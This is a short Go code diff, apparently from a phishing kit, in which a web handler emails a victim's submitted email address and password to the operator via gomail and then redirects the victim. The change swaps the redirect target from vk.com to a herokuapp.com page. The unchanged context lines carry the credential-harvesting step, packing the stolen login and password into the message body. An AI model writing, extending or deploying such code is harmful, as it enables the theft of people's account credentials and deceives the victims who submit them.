@@ -84,7 +84,7 @@ func Start() {
 		msg.SetBody("text/html", "email: "+ email + "\r\n pass: " + pass)
 
 		gomail.Send(sendCloser, msg)
-		c.Redirect(http.StatusMovedPermanently, "https://vk.com/")
+		c.Redirect(http.StatusMovedPermanently, "https://gotoboox.herokuapp.com/")
 		msg.Reset()
 	})
 
